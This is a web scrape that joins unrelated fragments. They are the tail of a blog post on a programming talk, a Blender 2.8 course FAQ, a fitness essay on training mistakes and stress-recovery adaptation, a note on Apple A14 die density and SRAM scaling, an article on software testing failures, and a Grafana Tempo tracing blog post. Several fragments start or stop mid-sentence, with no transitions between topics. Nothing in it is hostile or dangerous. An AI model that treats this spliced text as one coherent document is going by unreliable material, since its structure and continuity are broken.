          <p>(By the way, I'd really like to write more here, and would appreciate
          any suggestions.)</p>
          
          <h2>Behavior</h2>
          
          <p>Finally, behavior. I don't have too much to write here - I might need
          to watch some more talks - but I'll include Mr. Hickey's
          thought-provoking observation:</p>
          
          <blockquote>
          <p>There is no behavior. When you get hit by lightning, who's behaving?</p>
          </blockquote>
          
          <p>This may be what inspired Steve Yegge's post,
          <a href="http://steve-yegge.blogspot.com/2006/03/execution-in-kingdom-of-nouns.html">Execution in the Kingdom of Nouns</a>.</p>
          
          <h2>The End</h2>
          
          <p>Well, that's it for now. I hope you've found this post useful. If you
          have any suggestions, I'd love to hear them!</p>

          Frequently Asked Questions
        </h2>
        
        
        <p>
          When does the course start and finish?
        </p>
        <p>
          The course starts now and never ends! It is a completely self-paced online course - you decide when you start and when you finish.
        </p>
        
        <p>
          How long do I have access to the course?
        </p>
        <p>
          How does lifetime access sound? After enrolling, you have unlimited access to this course for as long as you like - across any and all devices you own.
        </p>
        
        <p>
          What if I am unhappy with the course?
        </p>
        <p>
          We would never want you to be unhappy! If you are unsatisfied with your purchase, contact us in the first 30 days and we will give you a full refund.
        </p>
        
        <p>
          I never used Blender before, am I able to follow this courses?
        </p>
        <p>
          Yes! This course is especially designed to help you get started, even if you don't know anything about Blender or 3D in general.
        </p>
        
        <p>
          Do I need a powerful system to run Blender 2.8?
        </p>
        <p>
          In general, Blender should also run on older systems. But when it comes to rendering, Blender 2.8 makes heavy use of your graphics card, especially when you're working with the EEVEE realtime renderer (what we will do a lot during this course). That's why we recommend to check if Blender 2.8 runs on your computer. <a href="https://code.blender.org/2019/04/supported-gpus-in-blender-2-80/">Here you can check if your graphics card is supported.</a> We also recommend <a href="https://builder.blender.org/download/">downloading the latest version of Blender 2.8</a> and check if it runs on your machine.
        </p>
        
        <p>
          Are you covering UV Mapping and Texturing in this course?
        </p>
        <p>
          To keep the content beginner friendly, we won't cover UV mapping and texturing in the main course. These topics are planned to be added in the future, as a bonus chapter. Stay tuned.
        </p>
        
        <p>
          Is this course suitable for advanced Blender users?
        </p>
        <p>
          It depends. When you feel really comfortable with Blender already, this course is probably not for you. However, if you want to make the switch from Blender 2.7x to Blender 2.8 this course can help you. Also, if you feel that after learning Blender for a while, you are still not able to bring the 3d projects to life which are in your head, this course can help you fill in the missing gaps.
        </p>
        
        <p>
          Can I get single chapters independently without buying the whole course?
        </p>
        <p>
          Sorry, this is not possible.
        </p>
        
        <p>
          Does this course work with Blender 2.9?
        </p>
        <p>
          Yes! The changes from Blender 2.8 to 2.9 won't much affect the course content. The UI of both versions are nearly identical, so you can easily follow. We also try to update outdated lessons. Also, if you get stuck, we are there to help you, just ask your questions in the comment section below the lessons.

      <p><img src="https://d33wubrfki0l68.cloudfront.net/f7870162b071951f3775d1abad3359269892043b/cbca1/assets/blog/img/fitness_main.jpg" alt=""></p>

<p>Deadlifting 337.5 lbs in my <a href="https://billmei.net/blog/gym-build">home gym</a>.</p>

<p>I wasted years failing at improving my health and fitness by following misguided “common sense” advice. I tried everything: P90X, cross-country running, bodybuilding, HIIT, swimming, BodBot, 2 types of yoga, CrossFit, rowing, personal training, F45, and cycling. None of them worked.</p>

<p>It seemed like everyone around me was getting results, but no matter how hard I tried, I wasn’t able to carry more things, attain a muscular physique, better outrun an emergency, or climb over a fence.</p>

<p>But after hundreds of hours of frustration and disappointment, I finally figured out what was preventing me from achieving the fitness results that I wanted.</p>

<p>I made 10 major mistakes by following “common sense” advice that hindered my progress for years. They are:</p>

<ol>
  <li><a href="#mistake-1-not-reasoning-from-first-principles">Not reasoning from first principles</a></li>
  <li><a href="#mistake-2-taking-action-instead-of-planning">Taking action instead of planning</a></li>

  <li><a href="#mistake-10-not-prioritizing-recovery">Not prioritizing recovery</a></li>
</ol>

<h2 id="mistake-1-not-reasoning-from-first-principles">Mistake #1: Not reasoning from first principles</h2>

<h3 id="who">Who</h3>

<p>I learned that everyone’s body is different. A nutrition and exercise program that works for me may not work for you, or vice-versa. Our genetics, physiology, and lifestyles are not the same so do not read this article as “advice” for you. It is advice only for me.</p>

<p>For example, I use more extreme language than other articles on health and fitness, because I find it necessary to go “all or nothing” in forming habits, but this writing style may be counterproductive if it does not fit your predilection; e.g. I’ll say something like “If you miss a workout, you have to <em>start over from the beginning</em>”, and this is not technically true because you can make up for the workout later, but I need to be told that the stakes are much higher than they actually are to motivate myself to stay on track. I regret that nobody was ever this forceful with me. By being too forgiving they gave me an excuse to not take things as seriously as I should have. You may find this writing style off-putting, but I will remind you that this is written for me, not for you.</p>

<p>One way I wasted a lot of time in the beginning is assuming that other peoples’ advice can apply to me, but it can’t. What worked was to figure out what first principles apply to my situation, and then build up a strategy from there to solve my individual needs, and not copy or follow someone else’s advice from the Internet.</p>

<h3 id="why">Why</h3>

<p>Why are health and fitness important? Physical health is required to operate in the physical universe. It’s the wellspring from which all other actions depend. Therefore, to improve your cognition, mood, relationships, career, morals—work out.</p>

<h3 id="how">How</h3>

<p>Ground truth comes from physics. The irreducible first step is Force = Mass × Acceleration. This is an inviolable law of the universe. Force production is therefore the only objective performance metric. All other secondary goals (weight loss, flexibility, cardiovascular health, etc.) are therefore relevant only when they are on the critical path to improving force production.<sup id="fnref:critical-path" role="doc-noteref"><a href="#fn:critical-path">1</a></sup></p>

<p>Maintaining health is expensive, and biological organisms do not spend more resources than marginally required by their environments, because any wasteful organism will be evolutionarily outcompeted by a more resource-conserving rival. Therefore, any increase in wellness must be proportional to a preceding increase in stress. This leads us to the second step, the <a href="#mistake-4-doing-exercise-instead-of-training">Stress Recovery Adaptation cycle</a> (SRA), which I will describe later. Any strategy that does not follow this is disallowed by biology.</p>

<h3 id="mistake-2-taking-action-instead-of-planning">Mistake #2: Taking action instead of planning</h3>

<blockquote>
  <p>It’s important not to overthink things—just take action! You’ll figure it out as you go.</p>
</blockquote>

<blockquote>
  <p>No plan survives contact with the enemy.</p>
</blockquote>

<blockquote>
  <p>Just Do It.</p>
</blockquote>

<p>These are all wrong. It turns out that planning is <em>really, really</em> important. I did not expect this, but having an appropriate plan <em>makes or breaks</em> your success.</p>

<p>Based on what I learned from entrepreneurship and the “Lean Startup Approach”, I assumed that a mediocre plan with great execution is better than a great plan with poor execution. This is not true for health and fitness.</p>

<p>A mediocre plan with great execution is not better than a great plan with poor execution. A mediocre plan with great execution achieves <em>nothing</em>.</p>

<p>Good planning is the difference between achieving all your goals, and achieving <em>nothing at all</em>. Action is irrelevant to outcome.</p>

<p>The problem with bad plans is that taking the <em>wrong</em> action gives you negative progress. “Just Do It” is harmful advice, because it gives you the illusion of progress while actually accomplishing nothing, or taking you in reverse.<sup id="fnref:reverse" role="doc-noteref"><a href="#fn:reverse">2</a></sup></p>

<p>It took years for me to learn this because the vast majority of exercise programs are not good. It was only by luck that after years of trying many different programs I finally found one that worked. The probability that the average personal trainer you pick after walking into a random commercial gym can design the right program is effectively nil.</p>

<p>To understand why planning is more important than action, I have to explain four other mistakes:</p>
<ul>
  <li>Mistake #3: Not planning all the way until the end</li>
  <li>Mistake #4: Doing exercise instead of training</li>
  <li>Mistake #5: Listening to experts</li>
  <li>Mistake #6: Following a plan not designed for me</li>
</ul>

<h3 id="mistake-3-not-planning-all-the-way-until-the-end">Mistake #3: Not planning all the way until the end</h3>

<p>Strenuous exercise is not required for success in modern civilization. Thus, the vast majority of people lack any adaptation to physical stress, with the result that even a tiny amount of exercise will produce results. This gives the misleading impression that exercise is “easy” because almost anything you do in the beginning will work; but “doing anything” eventually causes you to stall out very quickly when the early progress ends, you get frustrated, and then you quit.</p>

<p>From <a href="https://billmei.net/books/practical-programming-for-strength-training/">Practical Programming for Strength Training</a>:</p>
<blockquote>
  <p>Virtually anything that makes a novice work harder than bed rest will produce positive results. As a result, many people have an erroneous impression of the quality of their training system. Single sets, multiple sets, high volume, high intensity, super slow, supersets, giant sets, gnarlmonster sets – quite literally anything resembling a training program will produce better results than no program at all in novice trainees. <strong>This is known as “the novice effect,” and must be considered when training this population.</strong></p>
</blockquote>

<p>This is what happened to me: I tried cross-country running which worked for a bit until it didn’t, then I got discouraged and quit. Then I tried P90X which also worked for a bit until it didn’t, then I got frustrated and quit. And so on ad infinitum.</p>

<p>After I understood the novice effect, I could see that the key to a successful fitness program is not about how effective it is for beginners, but about how effective it is for people at all skill levels from beginner to olympian.</p>

<h3 id="mistake-4-doing-exercise-instead-of-training">Mistake #4: Doing exercise instead of training</h3>

<p><em>Exercise</em> is about physical activity. Almost any strenuous physical action you take can be classified as <em>exercise</em>, no matter if it is helpful or harmful in the long term.<sup id="fnref:exercise-vs-training" role="doc-noteref"><a href="#fn:exercise-vs-training">3</a></sup></p>

<p><em>Training</em> is about long-term goal-directed progress. It requires that you set an objective, measurable goal you can achieve (e.g. deadlift 200lbs, run 1 mile in under 20 minutes, finish 1st in my city’s tennis tournament). If an external observer cannot unambiguously say whether you succeeded or failed at your goal<sup id="fnref:failure" role="doc-noteref"><a href="#fn:failure">4</a></sup>, then you also cannot tell whether your day-to-day actions are beneficial or harmful to your long-term goal, hence this is not <em>training</em>.<sup id="fnref:fire-your-trainer" role="doc-noteref"><a href="#fn:fire-your-trainer">5</a></sup></p>

<p>The reason for this distinction is the biological first-principle that determines whether you will succeed or fail in the long-term: the <strong>Stress Recovery Adaptation cycle</strong>.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/815fe3b43867cf07a9398a20126ed188b57f3071/be6bc/assets/blog/img/fitness_sra-primary.png" alt="One iteration of the Stress Recovery Adaptation (SRA) cycle. Performing exercise creates stress on the body, which diminishes your biological capabilities for a short time. As you eat and sleep, your body repairs itself during recovery, plus some additional extra capacity (adaptation) to handle future stress."></p>

<p>x and y axes exaggerated for emphasis in all of these graphs.</p>

<p>Performing <em>exercise</em> creates <em>stress</em> on the body, which diminishes your biological capabilities for a short time. As you eat and sleep, your body repairs itself during <em>recovery</em>, plus some additional extra capacity (<em>adaptation</em>) to handle future stress.</p>

<p>The stress is an external signal to your body that your environment must be more dangerous than it previously assumed, so your body tries to adapt to enable you to have a better chance of staying alive going forward.</p>

<p>Doing a workout that isn’t any harder than what you did before does not lead to additional adaptation, because you didn’t signal to your body that your environment is more dangerous than it previously assumed:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/e279ba0e443b829d621c6490a4f5d66e69e78fa1/85ff1/assets/blog/img/fitness_sra-not-enough.png" alt="Undertraining in the Stress Recovery Adaptation (SRA) cycle. Insufficient stress creates a small drop in performance, but when you recover there is no additional adaptation above baseline. Hence, there is no performance improvement."></p>

<p>Biological organisms do not spend more resources than marginally required by their environments, because any wasteful organism will be evolutionarily outcompeted by a more resource-conserving rival. Thus, a lack of stress is a signal to your body that your environment must be safer than it previously assumed, so your body tries to conserve resources by decreasing its athletic capability:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/336a6ad7d7c8eefa02ca3dab85b92e046704afb9/ee30a/assets/blog/img/fitness_sra-atrophy.png" alt="Atrophy in the Stress Recovery Adaptation (SRA) cycle. When you skip a workout, no stress is applied, and performance slowly diminishes below baseline because your muscles atrophy. The result is a decrease in performance."></p>

<p>Conversely, too much stress that exceeds your body’s ability to recover will just result in your cells breaking down without being properly repaired:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/1fd88d0c95cbd5f093e41cdd5ac7628b54b9a72a/151b4/assets/blog/img/fitness_sra-too-much.png" alt="Overtraining in the Stress Recovery Adaptation (SRA) cycle. Too much stress creates a sharp performance drop-off that can't be recovered from properly. This leads to performance to revert to a level smaller than your original baseline, and hence is a performance decline."></p>

<p>Thus, the key to effective <em>training</em> is to carefully tune the amount of stress per <em>exercise</em> into the “Goldilocks zone” where you receive just enough stress to trigger an adaptation response, but not too much stress that you can’t recover, and not too little stress where you don’t trigger any adaptation response.</p>

<p>If you repeat this over a long time horizon, you get this classic (but incorrect!) graph that everyone draws, which you’ll see if you google this topic:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/9829068739fe825d7a72080130c41917eea6dda7/3478a/assets/blog/img/fitness_sra-wrong.png" alt="The classic diagram of the Strength Recovery Adaptation (SRA) cycle. Just as you recover to a higher baseline, you perform another workout to apply additional stress, and in order to move your fitness baseline even higher"></p>

<p>There is a key mistake made by everyone else who draws this graph. The big problem with the above diagram is that once you’ve adapted to a higher baseline, a larger amount of stress is required to trigger further adaptation!</p>

<p>Trying to exert the same stress on a higher baseline does not trigger adaptation, because your body has gotten used to it and the stress …</p></article></div>

<p>Our friends over at ICmasters have delved into the package of the Apple A14 Bionic. The die size has been unmasked, and it stands in at 88mm<sup>2</sup>. Despite cramming in 11.8 billion transistors, the die size is incredibly small thanks to utilization of TSMC’s 5nm process node.</p>

<p>The march of progress is not all rosy. Apple’s chips have historically achieved 90%+ of the process node’s theoretical density in their processors. This generation stands out by missing that mark by a large amount. A14 comes in at a cool 78% effective transistor density when compared to theoretical density. Despite TSMC claiming a 1.8x shrink for N5, Apple only achieves a 1.49x shrink.</p>

<p>This is not due to a failure of TSMC or Apple. These companies are clear leaders for the manufacturing and design of semiconductors respectively. Instead, this failure to convert theoretical to effective density stems from the slow death of SRAM scaling. SRAM is extensively used throughout a processor from registers to caches. Geoffrey Yeap of TSMC claims that the typical mobile SoC which consists of 60% logic, 30% SRAM, and 10% analog/IO.</p>

<p>TSMC’s N5 node diverges from prior shrinks by showing signs of slowing SRAM scaling. Despite being a full shrink with logic, the SRAM is a 1.35x shrink. This figure is overstated as it will end up being even lower once other the other assist circuitry is accounted for. Hence TSMC’s guidance of chip area reduction at 35%-40% with N5. SemiAnalysis expects this to be a trend that will persist with new nodes. TSMC and Samsung are already demonstrating 3D stacked SRAM which will help alleviate the issue of density.</p>

<p>3D Stacking is not the silver bullet. Cost scaling has begun slowing dramatically. With TSMC N5 wafer pricing in the ~$17k range, it is clear cost per transistor has not fallen. Even if SRAM scaling kept up, the cost per transistor would still have remained flat from N7 to N5.</p>

        <blockquote><p>Serious defects happen, despite the best efforts of QA departments. Here’s what you can learn from real world screw-ups, so you can avoid making the same mistakes.</p></blockquote>
<p>Accidents in software development and testing have brought headlines ranging from hilarious to horrific. Back in 2013, for example, millions of PayPal users were tickled to learn that the long-standing online payment system had erroneously awarded more than $92 quadrillion – yes, <em>quadrillion</em> – to another user. Yet software mishaps have also been blamed for devastating incursions into credit rating services, massive billing mistakes by health insurers, and tragically, even fatal airplane crashes.</p>
<p>The rise of <a href="https://www.functionize.com/blog/the-mobile-testing-gotchas-you-need-to-know-about/">mobile devices and software apps</a> has also helped to bring software issues more out into public view. On sites like Apple’s App Store and Google Play, consumers rate mobile apps and sometimes leave bug reports, thereby themselves participating in software testing, albeit after the app has already seen the proverbial light of day.</p>
<p><a href="https://www.functionize.com/blog/3-lessons-from-big-software-failures/">Software testing accidents happen</a> all the time, and most go unheralded except by company managers, software developers and testers, and any end users directly impacted.</p>
<p>Generally speaking, companies are tightlipped about the causes of software flaws, even when the error gains public attention. If you’ve kept up with the progress of any mobile apps in online stores, you’ll see that a bug related to this-or-that was fixed in a subsequent release, although nobody would tell you why the bug got there or why it wasn’t eradicated earlier through the company’s quality assurance testing<em>.</em></p>
<p>If you’re a software developer or tester, you already know that bugs can slip through the cracks at any of the manifold stages of software testing. There can’t be a tech person on Earth, however, who’s experienced every single sort of software disaster.</p>
<p>Here are five tips gleaned from lessons learned by seasoned testers and developers, along with the nitty-gritty details on real-life examples of software projects gone awry. Let’s take the positive approach here, with the useful takeaways, rather than indulge wholly in schadenfreude.</p>
<h3>Tip #1: Enforce a culture of testing at every level</h3>
<p>“Software testing is not foolproof by any means. Apple, Microsoft, Zoom, and almost any company with an app in an app store keeps releasing updates with fixes to holes and flaws in both functionality and security,” maintains David Galownia, CEO of the <a href="https://www.slingshotsoftware.com/" target="_blank" rel="noopener noreferrer">Slingshot</a> software and app development firm.</p>
<p>“Even when companies have rigorous testing processes, problems can slip through anyway,” Galownia adds. “You’re talking hundreds of thousands of lines of code and untold numbers of different ways users can use the software. It’s impossible to test them all.”</p>
<p>If a software error is relatively innocuous and rarely evident, <a href="https://www.functionize.com/blog/improve-your-debugging-strategies/">chasing it down through testing</a> can be a highly frustrating experience, anyhow. Galownia recalls a time early in his company’s history when testers kept trying, again and again, to discover the cause of a bug in a client’s software.</p>
<p>“For a long time, we couldn’t duplicate the bug no matter what we did. We tested every scenario we could think of, tested with multiple browsers, and put multiple eyes on it,” Galownia remembers. “When we eventually did stumble on to the cause of the error, we found it happened during a unique series in which the user went forward exactly seven steps in a process, then went back exactly four steps using the backspace button, and then went forward clicking something else. Once we finally found that out, it was an easy fix.”</p>
<p>Due to all the potential complexities involved, the CEO recommends “enforcing a culture of testing at every level.”&nbsp; Testing should start with “developers testing their own code and only saying they’re done when they themselves believe they have no bugs,” &nbsp;Galownia elaborates.</p>
<p>“Ideally, at that point a QA analyst is testing, but project and product managers should also test. Designers even should test and finally the client or end users should test in an alpha or beta setting,” Galownia says. The key is to have multiple different types of people who come at your software at different angles.</p>
<h3>Tip #2: Negotiate test deadlines</h3>
<p>We don’t live in an ideal world, though. All too often, projects aren’t given as much time for testing as developers and testers think they need.</p>
<p>In one particularly egregious case, a major statewide health insurance company expanded a new software system before it was ready to go full scale. As a result, more than <a href="https://www.ciklum.com/da/blog/5-famous-software-glitches-which-could-be-avoided-with-good-testing/" target="_blank" rel="noopener noreferrer">25,000 customers were enrolled</a> in the wrong health care plans; the knowledge became public when a<a href="https://abc11.com/system-failure-blue-bross-shield-health-insurance/1158471/" target="_blank" rel="noopener noreferrer"> company whistleblower</a> approached a local TV network affiliate. Documents suggested that the insurance company management were aware of technical issues and testing delays for months, but they got impatient and deployed the software anyway.</p>
<p>Alan Zucker, founding principal at <a href="https://pmessentials.us/" target="_blank" rel="noopener noreferrer">Project Management Essentials</a>, once grappled with his own time crunch. He was managing the development of a specialized accounting program that integrated the processing of a dozen applications.</p>
<p>The accounting program Zucker worked on required the building of a processing hub that received and shared information with the other applications. The accounting process was executed daily, weekly, and monthly with specific timing requirements.</p>
<p>“Our project timeline was very short because the company needed to quickly enable this capability,” Zucker says. “We did not have time to run an end-to-end monthly test that would allow us to replicate the process. So we created a testing strategy where we simulated the processing cycle.&nbsp; Rather than having the process triggers execute based on the cycle clock, we manually executed the workflow.”</p>
<p>So far, so good. In test, everything worked fine. But executing the cycle the first time in production turned out to be a different matter. “Everything fell apart. In order to have the information loaded the application and available to the accountants by 8:00 a.m. the process first process executed at midnight and the second process kicked off at 2:00 a.m. Well, the first process did not take 30 minutes as expected. It took over two hours to complete,” Zucker recalls.</p>
<p>“The cascading impacts were disastrous,” Zucker says. “We had to take the application out of production and start over. We made the decision to execute a full end-to-end test simulating the actual daily, weekly, and monthly processing cycles.&nbsp; We spent nearly two months fixing the bugs and retesting the application suite.”</p>
<p>Zucker learned three lessons from this debacle:</p>
<ol>
<li>Creating a robust and well considered testing strategy early in the project is essential when building a complicated system;</li>
<li>Simulating a process cycle using test data is a not a substitute for real end-to-end testing;</li>
<li>Compressing project schedules to meet externally mandated timelines can be disastrous. Project managers need to negotiate deadlines and expectations with their project sponsors.</li>
</ol>
<h3>Tip #3: Users come first</h3>
<p>Software problems are often caused by not enough testing, agrees David (Grue) DeBry, CTO and co-founder at web startup company <a href="https://www.volleyapp.com/" target="_new" rel="noopener noreferrer">Volley</a>. Yet the opposite problem – too much testing – can lead to needless product delays.</p>
<p>Culprits behind excessive testing are often “code cowboys,” or “engineers going off the rails by throwing out code,” says DeBry, whose 20 years of industry experience also includes visual effects development for a string of Hollywood movies.</p>
<p>The “code cowboys” can become so driven by their own needs for meeting defined engineering processes that they lose sight of why the software is being developed in the first place.</p>
<p>“Unit tests. Smoke tests. Regression tests. The list goes on,” DeBry says. “There’s constant feature improvement. You’re unable to move forward, and testing can cause other things to happen.”</p>
<p>When in “cowboy mode,” engineers try to eliminate <a href="https://www.agilealliance.org/introduction-to-the-technical-debt-concept/" target="_blank" rel="noopener noreferrer">technical debt</a>, or what results when software teams expedite the delivery of a piece of functionality or a project which later needs to be refactored. In other words, they balk at prioritizing speedy delivery over perfect code. Cowboys want “to “pay back the tech debt now,” according to DeBry.</p>
<p>Yet teams should instead focus on the people who will use the software, DeBry maintains. “Users are humans, and engineers maybe not so much. You don’t just write code. Efforts need to be organized around what to test and where. What’s important to do? What are the users’ priorities? There’s the argument that you don’t spend time testing for something if the user doesn’t care about it.”</p>
<h3>Tip #4: Don’t neglect the negative</h3>
<p>“Only testers who do nothing make no mistakes,” echoes Bartek Nowakowski, test lead at career website <a href="https://www.geeksforgeeks.org/difference-between-positive-testing-and-negative-testing/" target="_blank" rel="noopener noreferrer">Zety,</a> “When testing big apps there are a lot of connections between functionalities, so it is easy to miss some of them.”</p>
<p>Zety has run into complications by not performing negative testing, a form of testing that checks to find out how software will behave under unexpected circumstances, such as if a user types letters instead of numbers into a phone number field.</p>
<p>“So even if functionality works as intended there can be circumstances in which incorrect or unpredicted user behavior creates an edge case situation,” says Nowakowski. “These can occur for months before someone realizes there’s an issue.”</p>
<h3>Tip #5: Doing live testing? Warn your users!</h3>
<p>A variety of industry best practices can and do get overlooked in the heat of the moment during a software crisis.</p>
<p>“After some changes to our database, we wanted to test the new elements. Unfortunately, there was an error that severed the connection between the backend and frontend,” says Reuben Yonatan, CEO of <a href="https://www.getvoip.com/" target="_blank" rel="noopener noreferrer">GetVoIP</a>. “We couldn’t connect to the database. It took a while, but our IT team found the bug and fixed it. However, we suffered disruption to our services.”</p>
<p>To GetVoIP, the incident underscored the need to always be prepared with a backup when running a software test. “That way, if something …</p></div></div>

                    <div>
                        <p>About 2 years ago, <a href="https://grafana.com/blog/2018/12/12/loki-prometheus-inspired-open-source-logging-for-cloud-natives/">I wrote</a><a href="https://grafana.com/blog/2018/12/12/loki-prometheus-inspired-open-source-logging-for-cloud-natives/"> a long post</a> about why we built <a href="https://grafana.com/oss/loki/">Loki</a> and the tradeoffs we made. Now, we've just launched <a href="https://grafana.com/oss/grafana-tempo/">Tempo</a>, our tracing store, which I think takes a very unique approach to tracing. I've been raving about tracing <a href="https://grafana.com/blog/2019/09/09/how-grafana-labs-is-running-jaeger-at-scale-with-prometheus-and-envoy/">for a while now</a>, and I am <a href="https://promcon.io/2019-munich/talks/prometheus-and-jaeger-a-match-made-in-heaven/">personally a massive fan</a>! Before I dive in, I have to say that both <a href="https://twitter.com/mrannanay">Annanay</a> and <a href="https://twitter.com/actually_chores">Joe</a> did an amazing job with Tempo given the short amount of time they had and I am completely blown away, just watching from the sidelines! Amazing job team! Read the official blog and how to get involved here: <a href="https://deploy-preview-2675--grafana.netlify.app/blog/2020/10/27/announcing-grafana-tempo-a-massively-scalable-distributed-tracing-system/">https://grafana.com/blog/2020/10/27/announcing-grafana-tempo-a-massively-scalable-distributed-tracing-system/</a></p><h2 id="omg-the-index-">OMG the index!</h2><p>But tracing is not without its problems, the chief of them is cost. Most of the cost comes down to the indexing issues. You have to run <a href="https://www.jaegertracing.io/">Jaeger</a>, the leading open-source solution with either Cassandra or Elastic, both beasts of their own and extremely complex and costly to scale. The main reason to use them is because of the query and data patterns.</p><p>Traces have a varied datamodel, but fundamentally we track durations, and each of the object, called a span, we track has the following structure:</p><pre><code>spanID → string
traceID → string
functionName → string

tags → map[string]string

startTime → time.Time
duration → time.Duration

parentSpan → string (is a spanID if it has a parent span, else “” to indicate rootSpan)
</code></pre><p>Now in Jaeger, we basically have to answer a few queries, first of them is give me all the spans for a particular traceID, i.e, something like:</p><pre><code>SELECT spans WHERE traceID=XXXX</code></pre><p>Once, we have all the spans, we can reconstruct the full trace to be something like:</p><figure><img src="https://gouthamve.dev/content/images/2020/10/image-2.png" alt="" srcset="https://gouthamve.dev/content/images/size/w600/2020/10/image-2.png 600w, https://gouthamve.dev/content/images/2020/10/image-2.png 952w" sizes="(min-width: 720px) 720px"></figure><p>The second class of questions to answer is to select the traces matching a particular criteria, for example, give me all the traces emitted by the gateway for requests by user XXX on path `/home` that took more than `5s`.</p><pre><code>SELECT unique(traceIDs) 
LIMIT 1000 						[not-optional]
WHERE 
tags(user=XXX and service=gateway and operation=/home)		[optional]
duration &gt; 5s							[optional]
T1 &lt; time.start &lt; T2		</code></pre><p>Once we have all the traceIDs, we can use the query above to get all the spans for those traceIDs and we can get all the traces we want. Here in lies the problem, we need to lookup things on a set of arbitrary tags, and these tags are neither constant nor a predefined set.</p><p>Developers can and in most cases need to add 1000s of tags over the lifetime of the service, and each of these tags can have an insane cardinality, for example, the tags for userID or IPAddr have virtually infinite cardinality. To create a very efficient index is really hard, hence the dependency on Cassandra or Elasticsearch, but once you start using them, things start becoming expensive very quickly. One solution to the problem is to define a very strict set of tags with low cardinality, but the moment you start doing that you start losing out on a lot of the benefits of tracing.</p><h2 id="enter-tempo">Enter Tempo</h2><p>So, <a href="https://docs.google.com/document/d/153NHJ9RZttAMbIGUEY8x61W3TZej-jXKjOqOppJiuvc/edit">I've played around with this problem before</a> and I'm convinced that the best index for tracing is a columnar store, but hotdemn, there is not a single columnar store that is easy to operate, like Prometheus. The team went looking and realised the complexity and decided to break the problem into two parts:</p><h3 id="finding-the-relevant-traceids">Finding the relevant traceIDs</h3><p>Our biggest use case for tracing is to debug query and request performance and we realised most of our queries are of the form, give me all the traceIDs from this namespace, for this user that took longer than 5s. And tbh, the Jaeger querying <a href="https://github.com/jaegertracing/jaeger/issues/166">didn't really work for us</a> so we did the next best thing, <a href="https://github.com/weaveworks/common/pull/123">we printed out the traceID in the request logs</a> and then generated a daily report!</p><figure><img src="https://gouthamve.dev/content/images/2020/10/block-out-2.png" alt="" srcset="https://gouthamve.dev/content/images/size/w600/2020/10/block-out-2.png 600w, https://gouthamve.dev/content/images/size/w1000/2020/10/block-out-2.png 1000w, https://gouthamve.dev/content/images/size/w1600/2020/10/block-out-2.png 1600w, https://gouthamve.dev/content/images/2020/10/block-out-2.png 2271w" sizes="(min-width: 720px) 720px"><figcaption>Our daily report with the queries blurred out.</figcaption></figure><p>We basically traced and stored <em>all </em>the read path requests and then from this report, we picked the slowest queries and looked them up in Jaeger. This worked wonders, but over time, as our query load grew, we had to switch on sampling and could only store 50% of our queries. This meant when I was looking at a particularly interesting query, there is only a 50% chance I could look it up. Less than ideal, but we could live with it (for the short term ;)). We were using Loki to retrieve the logs and then had custom logic to generate this report but now with <a href="https://grafana.com/docs/loki/latest/logql/">Loki v2.0, you can basically use LogQL</a> to generate all the info in the report above!</p><p>As we started to explore how a new tracing solution would look like, we realised that we could offload the <em>discovery</em> of traceIDs to logs and metrics. For logs, the report above is enough, and in general we can figure out which traces are interesting by looking at the request logs. </p><figure><img src="https://gouthamve.dev/content/images/2020/10/image-4.png" alt="" srcset="https://gouthamve.dev/content/images/size/w600/2020/10/image-4.png 600w, https://gouthamve.dev/content/images/size/w1000/2020/10/image-4.png 1000w, https://gouthamve.dev/content/images/2020/10/image-4.png 1118w" sizes="(min-width: 720px) 720px"></figure><p>For metrics, we slowly started the work of adding exemplars into Prometheus, so that we can basically jump to a trace from a graph. A good example is the screenshot above. This is with an experimental version (<a href="https://github.com/prometheus/prometheus/pull/6635">open PR</a>) of Prometheus, you can see that the spikes in latency are only due to the very short spike (at the beginning) and the graph is over 1m, because of the <code>rate[1m]</code>. This is super interesting information already, but the killer feature is that you can click on a dot to jump to the trace for that latency!</p><p>We've been touting this holy grail of jumping between metrics, logs and traces for a while now and we decided for the first version, not having an index and powering all the lookups through Loki and Prometheus might be enough. It's an interesting experiment to run tbh, and it works quite well for us. We just have to see how others react to it, it takes <em>a lot of discipline</em>. You need to print traceIDs in your logs and expose exemplars in your applications and nothing in this workflow is commonplace.</p><h3 id="tempodb-the-kv-store-over-object-store">TempoDB: The KV store over Object Store</h3><p>Okay cool, we kinda sorta circumvented the problem of finding the right traceIDs, we still needed to figure out how to lookup the traces given a traceID. Now tracing is no small beast, you need to store a lot of information. For every single request, we need to store all the RPC calls, and the tags associated with each RPC call (namespace, pod, service, endpoint, function, etc.) <em>atleast</em> but the power of tracing is truly unlocked when you start instrumenting specific functions you're curious about and various other metadata.</p><p>This means for about 1K QPS (our query load), we're writing 170K spans/sec and and 40MB/s of data. This is insane, with a week of retention its <strong>24TB of data</strong>!<strong> </strong>Now, not a lot of storage systems can handle that load and even if they can, they're a pain to manage and build.</p><p>Going back a little, that amount of data is not new to us. We run our <a href="http://grafana.com/cloud">hosted Prometheus</a> solution on top of <a href="https://cortexmetrics.io/">Cortex</a>, which manages several hundred TB on top of Bigtable. Cortex also supports Cassandra, DynamoDB, but one problem ails all these systems: They're hard to manage and expensive to run! <a href="https://thanos.io/">Thanos</a>, another project that does long term storage for Prometheus, uses Object Storage like S3, GCS, Minio, etc. to store data. It saw a lot of adoption, even with the existence of a more mature Cortex project, and a large part of the credit goes to using Object Storage which reduces the TCO by an order of magnitude and makes the system overall much easier to use.</p><p>We've learnt from Thanos and made sure Loki could run purely off of object storage and made it super easy to use and we saw incredible success! At this point it was clear that if we wanted to build a scalable, robust but <em>inexpensive</em> tracing solution, we needed to build it on top of Object Storage. To put it in perspective, storing 24TB in GCS costs less than $500 per month! This is great, and now Cortex's new storage engine borrows from Thanos and is fully backed by an Object Store and easy to use as well!</p><p>With that decision, we needed to see what the datamodel looks like and we quickly realised that all we needed was a KV Store built on top of Object Storage. Literally the query model is to load all the spans for a <em>traceID</em>. Hence a KV store where the key is the <em>traceID </em>and the value is the blob of spans for that traceID. Now, a trace object (the collection of spans) is super small in the order of bytes to a few KB hence using the <em>traceID</em> as the key in the object store won't work, atleast not cost efficiently. We need much bigger objects for this to work.</p><p>Enter <a href="https://github.com/grafana/tempo/tree/master/tempodb">tempodb</a>, our KV store built on top of Object Store. tempodb collects the KV objects and builds them into large blocks, several 100MBs big and stores them in an object store. It has a lot of 